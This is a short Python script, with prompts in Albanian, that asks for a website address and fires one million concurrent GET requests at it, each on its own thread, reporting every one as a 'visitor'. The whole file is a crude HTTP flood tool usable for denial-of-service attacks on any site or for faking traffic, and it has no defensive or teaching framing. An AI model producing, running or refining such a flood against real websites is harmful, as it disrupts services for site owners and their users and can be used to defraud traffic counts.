import requests
import threading

def send_request(url, visitor_number):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"Vizitori {visitor_number}, u dërgua me sukses!")
    except requests.exceptions.RequestException as e:
        print("Gabim gjatë dërgimit të kërkesës:", str(e))

url = input("Ju lutem, jepni uebsajtin: ")
numri_kerkesave = 1000000
numri_shokeve = 100

for i in range(numri_kerkesave):
    threading.Thread(target=send_request, args=(url, i+1)).start()
